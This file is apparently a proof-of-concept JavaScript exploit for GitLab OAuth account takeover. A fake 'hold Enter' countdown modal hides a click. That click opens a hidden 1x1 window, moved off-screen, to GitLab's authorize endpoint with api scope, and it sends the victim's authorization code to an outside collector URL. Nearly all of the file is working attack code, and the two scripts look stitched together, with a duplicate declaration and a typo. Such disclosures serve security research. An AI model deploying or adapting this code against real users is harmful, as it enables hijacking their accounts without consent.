// script.js
document.addEventListener('DOMContentLoaded', () => {
  let keyDownTime = 0;
  
  const modal = document.getElementById('modal');
  const countdownElement = document.getElementById('countdown');
  let countdownValue = 3; // Countdown from 3 to 0
  let countdown; // To store the setInterval() reference
  let done;
  
  document.addEventListener('keydown', (e) => {
    if (done){
      return
    }
    if (e.key === "Enter" && keyDownTime === 0) {
      countdownElement.hidden =false;
      keyDownTime = Date.now();
      
      countdown = setInterval(() => {
        const timePassed = Date.now() - keyDownTime;
        const secondsPassed = Math.floor(timePassed / 1000);
        countdownElement.textContent = Math.max(3 - secondsPassed, 0);
        
        if (secondsPassed >= 3) {
          clearInterval(countdown);
          countdownElement.textContent = "Thanks!";
          done = true;
          setTimeout(() => {
            modal.style.display = "none";
          }, 1000); // Close modal after 2 seconds
        }
      }, 1000);
    }
  });
  
  document.addEventListener('keyup', (e) => {
    if (done){
      return
    }
    if (e.key === "Enter") {
      clearInterval(countdown);
      keyDownTime = 0;
      countdownValue = 3;
      countdownElement.textContent = countdownValue;
    }
  });
});

 let countdown;

    let attack = false;
    let done = false;
    let welcome = false;

    document.addEventListener("keydown", function (event) {
      // This is the page functionality
      if (event.key === "Enter") {
        setTimeout(() => {
          // This is the attack
          if (!attack) {
            //open new window with smallest possible height and width for a window
            var win = window.open(
              "https://gitlab.com/oauth/authorize?client_id=3b8ab98acc7455520984a5217b2ed3545d4419ad4a7862241804ae0cc83d687b&redirect_uri=https://joaxcar.com/gitlab/poc_ato_click.php&response_type=code&state=STATE&scope=api#commit-changes",
              "a",
              "width=1,heght=1"
            );
            //attempt to resize the window to even smaller size (works better for Safari and IE/Edge/Opera)
            win.resizeTo(1, 1);
            //sleight of hand to move the new window to the edge of the screen so it doesn't capture the eye.
            win.moveTo(4000, 4000);
            //close the new window as fast as possible to hide what happened
            //(the faster the page loads, the faster the window can close)

            //show target user a message their expected action is complete
            attack = true;
          }
        }, 500);
      }
    });

